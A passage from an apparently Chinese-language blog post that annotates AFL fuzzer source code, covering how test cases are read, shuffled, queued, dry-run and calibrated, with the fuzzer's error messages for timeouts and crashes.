in_dir);</span><br><span class="line"><span class="keyword">if</span> (!access(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> ck_free(fn);</span><br><span class="line"></span><br><span class="line">ACTF(<span class="string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);</span><br></pre></td></tr></table></figure><p>通过scandir获取字母序的目录文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl_cnt = scandir(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br></pre></td></tr></table></figure><p>如果设置了shullle_queue，并且queue数量大于1，那就打乱此nl数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">  shuffle_ptrs((<span class="type">void</span>**)nl, nl_cnt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shuffle的逻辑也很简单，就是进行n次的随机交换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">shuffle_ptrs</span><span class="params">(<span class="type">void</span>** ptrs, u32 cnt)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cnt - <span class="number">2</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 j = i + UR(cnt - i);</span><br><span class="line">    <span class="type">void</span> *s = ptrs[i];</span><br><span class="line">    ptrs[i] = ptrs[j];</span><br><span class="line">    ptrs[j] = s;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是一个大循环，用来对于testcase一个个进行初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">   u8* fn = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">   u8* dfn = alloc_printf(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">   <span class="comment">// 首先找到两个对应文件</span></span><br><span class="line">   u8  passed_det = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">   <span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line">   <span class="comment">// 然后释放文件nl对象内存 </span></span><br><span class="line">   <span class="keyword">if</span> (lstat(fn, &amp;st) || access(fn, R_OK))</span><br><span class="line">     PFATAL(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"><span class="comment">// 判断是否可以存在相应文件</span></span><br><span class="line">   <span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!S_ISREG(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.testcases&quot;</span>)) &#123;</span><br><span class="line">     <span class="comment">// 剔除 &quot;.&quot;、&quot;..&quot; 和 README.testcases </span></span><br><span class="line">     <span class="comment">// 以及空文件 等无效文件</span></span><br><span class="line">     ck_free(fn);</span><br><span class="line">     ck_free(dfn);</span><br><span class="line">     <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">     FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">           DMS(st.st_size), DMS(MAX_FILE));</span><br><span class="line">   <span class="comment">// 如果testcase太大</span></span><br><span class="line">   <span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">      is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">      fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">      and probably very time-consuming. */</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">// 通过是否存在deterministic_done文件，来判断是否是resuming </span></span><br><span class="line"><span class="comment">// 如果是resume，则跳过deterministic fuzz 阶段</span></span><br><span class="line">   <span class="keyword">if</span> (!access(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line">   ck_free(dfn);</span><br><span class="line">   <span class="comment">// 将testcase添加进queue </span></span><br><span class="line">   add_to_queue(fn, st.st_size, passed_det);</span><br><span class="line">   </span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后是收尾的一些处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(nl); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!queued_paths)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">       <span class="string">&quot;Looks like there are no valid test cases in the input directory! The fuzzer\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    needs one or more test case to start with - ideally, a small file under\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    1 kB or so. The cases must be stored as regular files directly in the\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    input directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">last_path_time = <span class="number">0</span>;</span><br><span class="line">queued_at_start = queued_paths;</span><br></pre></td></tr></table></figure><h4 id="add-to-queue">add_to_queue</h4><p>通过add_to_queue 将testcase加入queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">add_to_queue</span><span class="params">(u8* fname, u32 len, u8 passed_det)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span>* <span class="title">q</span> =</span> ck_alloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> queue_entry));</span><br><span class="line"></span><br><span class="line">  q-&gt;fname        = fname;</span><br><span class="line">  q-&gt;len          = len;</span><br><span class="line">  q-&gt;depth        = cur_depth + <span class="number">1</span>;</span><br><span class="line">  q-&gt;passed_det   = passed_det;</span><br><span class="line">  <span class="comment">// 设置queue的各个成员信息</span></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;depth &gt; max_depth) max_depth = q-&gt;depth;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_top) &#123;</span><br><span class="line"></span><br><span class="line">    queue_top-&gt;next = q;</span><br><span class="line">    queue_top = q;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> q_prev100 = <span class="built_in">queue</span> = queue_top = q;</span><br><span class="line">  <span class="comment">// 将此queue_entry加入队列</span></span><br><span class="line">  <span class="comment">// 将此queue_entry放入queue_top</span></span><br><span class="line">  queued_paths++;</span><br><span class="line">  <span class="comment">// 增加queue路径</span></span><br><span class="line">  pending_not_fuzzed++;</span><br><span class="line">  <span class="comment">// 增加等待fuzz 计数</span></span><br><span class="line">  cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Set next_100 pointer for every 100th element (index 0, 100, etc) to allow faster iteration. */</span></span><br><span class="line">  <span class="keyword">if</span> ((queued_paths - <span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span> &amp;&amp; queued_paths &gt; <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="comment">// q_prev100 是一个相对于普通queue间隔100的queue，</span></span><br><span class="line">  <span class="comment">// 用来快速访问</span></span><br><span class="line">    q_prev100-&gt;next_100 = q;</span><br><span class="line">    q_prev100 = q;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  last_path_time = get_cur_time();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中最核心的部分就是设置了两个queue</p><h3 id="perform-dry-run-对于testcase的试运行">perform_dry_run | 对于testcase的试运行</h3><p>此函数会遍历queue中的每个个体，然后对于对应的testcase进行一下试运行，并根据运行结果先筛选出不合适的testcase。</p><p>首先创建了一些局部变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">q</span> =</span> <span class="built_in">queue</span>;</span><br><span class="line">u32 cal_failures = <span class="number">0</span>;</span><br><span class="line">u8 *skip_crashes = getenv(<span class="string">&quot;AFL_SKIP_CRASHES&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>然后进入了一个循环</strong></p><p>循环的开始是通过queue的文件名读取了输入用例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (q)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  u8 *use_mem;</span><br><span class="line">  u8 res;</span><br><span class="line">  s32 fd;</span><br><span class="line"></span><br><span class="line">  u8 *fn = <span class="built_in">strrchr</span>(q-&gt;fname, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line">  </span><br><span class="line">  fd = open(q-&gt;fname, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"> </span><br><span class="line">  use_mem = ck_alloc_nozero(q-&gt;len);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(fd, use_mem, q-&gt;len) != q-&gt;len)</span><br><span class="line">    FATAL(<span class="string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br></pre></td></tr></table></figure><p>然后通过 <code>calibrate_case</code>  对testcase进行了处理并尝试运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = calibrate_case(argv, q, use_mem, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">ck_free(use_mem);</span><br></pre></td></tr></table></figure><p>根据运行结果进行相应错误处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)</span><br><span class="line">      SAYF(cGRA <span class="string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST,</span><br><span class="line">           q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (res)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_NONE:</span><br><span class="line">      <span class="comment">// 如果没有错误，并且是queue的第一个testcase</span></span><br><span class="line">      <span class="keyword">if</span> (q == <span class="built_in">queue</span>)</span><br><span class="line">        check_map_coverage();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (crash_mode)</span><br><span class="line">        FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; does *NOT* crash&quot;</span>, fn);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_TMOUT:</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (timeout_given)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* The -t nn+ syntax in the command line sets timeout_given to &#x27;2&#x27; and</span></span><br><span class="line"><span class="comment">           instructs afl-fuzz to tolerate but skip queue entries that time</span></span><br><span class="line"><span class="comment">           out. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (timeout_given &gt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          WARNF(<span class="string">&quot;Test case results in a timeout (skipping)&quot;</span>);</span><br><span class="line">          q-&gt;cal_failed = CAL_CHANCES;</span><br><span class="line">          cal_failures++;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">             <span class="string">&quot;The program took more than %u ms to process one of the initial test cases.\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    Usually, the right thing to do is to relax the -t option - or to delete it\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    altogether and allow the fuzzer to auto-calibrate. That said, if you know\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    what you are doing and want to simply skip the unruly test cases, append\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    &#x27;+&#x27; at the end of the value passed to -t (&#x27;-t %u+&#x27;).\n&quot;</span>,</span><br><span class="line">             exec_tmout,</span><br><span class="line">             exec_tmout);</span><br><span class="line"></span><br><span class="line">        FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; results in a timeout&quot;</span>, fn);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">             <span class="string">&quot;The program took more than %u ms to process one of the initial test cases.\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    This is bad news; raising the limit with the -t option is possible, but\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    will probably make the fuzzing process extremely slow.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;    If this test case is just a fluke, the other option is to just avoid it\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    altogether, and find one that is less of a CPU hog.\n&quot;</span>,</span><br><span class="line">             exec_tmout);</span><br><span class="line"></span><br><span class="line">        FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; results in a timeout&quot;</span>, fn);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_CRASH:</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (crash_mode)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (skip_crashes)</span><br><span class="line">      &#123;</span><br><span class="line">        WARNF(<span class="string">&quot;Test case results in a crash (skipping)&quot;</span>);</span><br><span class="line">        q-&gt;cal_failed = CAL_CHANCES;</span><br><span class="line">        cal_failures++;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (mem_limit)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">             <span class="string">&quot;Oops, the program crashed with one of the test cases provided. There are\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    several possible explanations:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;    - The test case causes known crashes under normal working conditions. If\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      so, please remove it. The fuzzer should be seeded with interesting\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      inputs - but not ones that cause an outright crash.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;    - The current memory limit (%s) is too low for this program, causing\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      it to die due to OOM when parsing valid files. To fix this, try\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      bumping it up with the -m setting in the command line. If in doubt,\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      try something along the lines of:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">             <span class="string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/binary [...] &lt;testcase )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">             <span class="string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/binary [...] &lt;testcase )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      estimate the required amount of virtual memory for the binary. Also,\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      if you are using ASAN, see %s/notes_for_asan.txt.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      binaries. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;    - Least likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,</span><br><span class="line">             DMS(mem_limit &lt;&lt; <span class="number">20</span>), mem_limit - <span class="number">1</span>, doc_path);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">             <span class="string">&quot;Oops, the program crashed with one of the test cases provided. There are\n&quot;</span></span><br><span class="line">             <span class="string">&quot;    several possible explanations:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;    - The test case causes known crashes under normal working conditions. If\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      so, please remove it. The fuzzer should be seeded with interesting\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      inputs - but not ones that cause an outright crash.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      binaries. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">             <span class="string">&quot;    - Least likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span></span><br><span class="line">             <span class="string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; results in a crash&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_ERROR:</span><br><span class="line"></span><br><span class="line">      FATAL(<span class="string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_NOINST:</span><br><span class="line"></span><br><span class="line">      FATAL(<span class="string">&quot;No instrumentation detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FAULT_NOBITS:</span><br><span class="line"></span><br><span class="line">      useless_at_start++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_bitmap &amp;&amp; !shuffle_queue)</span><br><span class="line">        WARNF(<span class="string">&quot;No new instrumentation output, test case may be useless.&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>结束了循环</strong></p><p>最后进行了错误处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cal_failures)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cal_failures == queued_paths)</span><br><span class="line">    FATAL(<span class="string">&quot;All test cases time out%s, giving up!&quot;</span>,</span><br><span class="line">          skip_crashes ? <span class="string">&quot; or crash&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  WARNF(<span class="string">&quot;Skipped %u test cases (%0.02f%%) due to timeouts%s.&quot;</span>, cal_failures,</span><br><span class="line">        ((<span class="type">double</span>)cal_failures) * <span class="number">100</span> / queued_paths,</span><br><span class="line">        skip_crashes ? <span class="string">&quot; or crashes&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cal_failures * <span class="number">5</span> &gt; queued_paths)</span><br><span class="line">    WARNF(cLRD <span class="string">&quot;High percentage of rejected test cases, check settings!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">OKF(<span class="string">&quot;All test cases processed.&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="calibrate-case">calibrate_case</h4><p>用来运行一次fuzz目标程序，并且记录fuzz运行的结果，用来校准对应的testcase</p><p>首先创建了一些局部变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8 